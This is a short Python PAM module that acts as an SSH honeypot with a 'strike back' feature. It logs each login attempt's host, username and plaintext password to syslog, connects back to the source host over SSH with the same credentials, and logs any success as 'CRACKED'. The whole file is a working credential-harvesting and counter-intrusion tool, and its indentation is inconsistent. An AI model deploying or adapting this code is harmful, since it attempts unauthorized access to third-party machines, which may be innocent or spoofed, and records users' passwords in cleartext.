import crypt, spwd, syslog, socket, sys, libssh2 

def auth_log(msg):
 syslog.openlog(facility=syslog.LOG_AUTH)
 syslog.syslog("SSH: " + msg)
 syslog.closelog()

def pam_sm_authenticate(pamh, flags, argv):
  user = pamh.get_user()
  resp = pamh.conversation(pamh.Message(pamh.PAM_PROMPT_ECHO_OFF, 'Passsword:'))
  auth_log("Remote Host: %s (%s:%s)" % (pamh.rhost, user, resp.resp))
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.settimeout(10)
  auth_log("Initiating strike back against %s!!!!!!" % (pamh.rhost))
  try:
   sock.connect((pamh.rhost, 22))
  except:
   auth_log("strike back can't connect")
   sys.exc_clear()
   return pamh.PAM_AUTH_ERR

  session = libssh2.Session()
  session.startup(sock)
  try:
   session.userauth_password(user, resp.resp)
   if session.last_error()[0] == 0:
  	auth_log("CRACKED: %s %s:%s" % (pamh.rhost, user, resp.resp))
   else:
	auth_log("strike back failed %s" % session.last_error()[1])
  except:
   auth_log("strike back failed %s" % session.last_error()[1])
   sys.exc_clear()
  return pamh.PAM_AUTH_ERR

def pam_sm_setcred(pamh, flags, argv):
 return pamh.PAM_SUCCESS

def pam_sm_acct_mgmt(pamh, flags, argv):
 return pamh.PAM_SUCCESS

def pam_sm_open_session(pamh, flags, argv):
 return pamh.PAM_SUCCESS

def pam_sm_close_session(pamh, flags, argv):
 return pamh.PAM_SUCCESS

def pam_sm_chauthtok(pamh, flags, argv):
 return pamh.PAM_SUCCESS
